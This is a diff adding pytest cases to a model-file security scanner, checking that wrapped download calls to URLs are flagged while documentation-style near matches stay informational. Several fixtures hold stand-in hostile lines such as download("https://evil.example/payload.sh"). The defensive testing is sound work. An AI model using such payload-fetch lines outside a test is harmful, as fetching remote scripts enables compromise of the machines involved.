@@ -586,6 +586,128 @@ def test_text_scanner_model_card_wrapped_call_markdown_link_remains_actionable(t
 @pytest.mark.parametrize(
     "content",
     [
+        'download(\n"https://evil.example/payload.sh"\n)\n',
+        'download(\n"padding",\n"https://evil.example/payload.sh"\n)\n',
+    ],
+)
+def test_text_scanner_model_card_zero_indent_wrapped_call_url_remains_actionable(tmp_path: Path, content: str) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(
+        content,
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert any(
+        check.details.get("normalized_evidence")
+        == {
+            "kind": "url",
+            "value": "https://evil.example/payload.sh",
+        }
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in network_checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        'download:\n"https://docs.example.com/reference"\n',
+        "download(\n# docs: https://docs.example.com/reference\n)\n",
+        "| Helper | Reference |\n| --- | --- |\n| `download(` | https://docs.example.com/reference |\n",
+        "| Helper | Reference |\n| --- | --- |\n| download( | https://docs.example.com/reference |\n",
+        (
+            "| Helper | Reference |\n"
+            "| --- | --- |\n"
+            "| `download(` | passive literal |\n"
+            "| Docs | https://docs.example.com/reference |\n"
+        ),
+        (
+            "| Helper | Reference |\n"
+            "| --- | --- |\n"
+            "| download( | passive literal |\n"
+            "| Docs | https://docs.example.com/reference |\n"
+        ),
+    ],
+)
+def test_text_scanner_model_card_passive_download_near_match_urls_stay_informational(
+    tmp_path: Path,
+    content: str,
+) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(
+        content,
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert network_checks
+    assert all(check.severity == IssueSeverity.INFO for check in network_checks)
+    assert determine_exit_code(aggregate) == 0
+
+
+@pytest.mark.parametrize(
+    "payload",
+    [
+        b'download(\n"https://evil.example/payload.sh"\n)\n',
+        b'download(\n"padding",\n"https://evil.example/payload.sh"\n)\n',
+    ],
+)
+def test_text_scanner_documentation_open_call_detects_zero_indent_wrapped_url(payload: bytes) -> None:
+    position = payload.index(b"https://")
+
+    assert TextScanner._documentation_open_call_contains_position(payload, position)
+
+
+@pytest.mark.parametrize(
+    "payload",
+    [
+        b'download:\n"https://docs.example.com/reference"\n',
+        b"download(\n# docs: https://docs.example.com/reference\n)\n",
+        (
+            b"| Helper | Reference |\n"
+            b"| --- | --- |\n"
+            b"| `download(` | passive literal |\n"
+            b"| Docs | https://docs.example.com/reference |\n"
+        ),
+        (
+            b"| Helper | Reference |\n"
+            b"| --- | --- |\n"
+            b"| download( | passive literal |\n"
+            b"| Docs | https://docs.example.com/reference |\n"
+        ),
+    ],
+)
+def test_text_scanner_documentation_open_call_ignores_zero_indent_passive_near_matches(payload: bytes) -> None:
+    position = payload.index(b"https://")
+
+    assert not TextScanner._documentation_open_call_contains_position(payload, position)
+
+
+@pytest.mark.parametrize(
+    "prefix",
+    [
+        b"`download(` ",
+        b"| `download(` | ",
+        b"| download( | ",
+    ],
+)
+def test_text_scanner_documentation_enclosing_call_ignores_markdown_table_call_literals(prefix: bytes) -> None:
+    assert not TextScanner._documentation_prefix_has_enclosing_call(prefix)
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
         'payloads = {"doc": "[download](https://evil.example/payload.sh)"}\n',
         'payloads = {"#doc": "[download](https://evil.example/payload.sh)"}\n',
         'payloads = {"note": "#", "doc": "[download](https://evil.example/payload.sh)"}\n',
@@ -2873,6 +2995,44 @@ def test_text_scanner_documentation_passive_endpoint_redaction_limit_is_informat
 
     assert result.success is True
     assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME
+    assert any(
+        check.name == "Network Communication Reporting Limit"
+        and check.severity == IssueSeverity.INFO
+        and check.details.get("truncated_finding_type") == "endpoint_redaction_classification"
+        and check.details.get("analysis_incomplete") is False
+        and check.details.get("reporting_incomplete") is True
+        for check in result.checks
+    )
+    assert not any(
+        check.name == "Text Content Security Coverage" and check.status == CheckStatus.FAILED for check in result.checks
+    )
+
+
+def test_text_scanner_documentation_passive_raw_table_endpoint_redaction_limit_is_informational(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(network_comm, "_redact_network_evidence", lambda text: text)
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        "api_key references below are documentation-only.\n"
+        "| Helper | Reference |\n"
+        "| --- | --- |\n"
+        + "\n".join(f"| download( | https://cdn.openai.com/papers/{index}.pdf |" for index in range(40))
+        + "\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner(config={"check_secrets": False}).scan(str(text_path))
+    aggregate = scan_model_directory_or_file(
+        str(text_path),
+        config={"check_secrets": False},
+        cache_enabled=False,
+    )
+
+    assert result.success is True
+    assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME
+    assert determine_exit_code(aggregate) == 0
     assert any(
         check.name == "Network Communication Reporting Limit"
         and check.severity == IssueSeverity.INFO
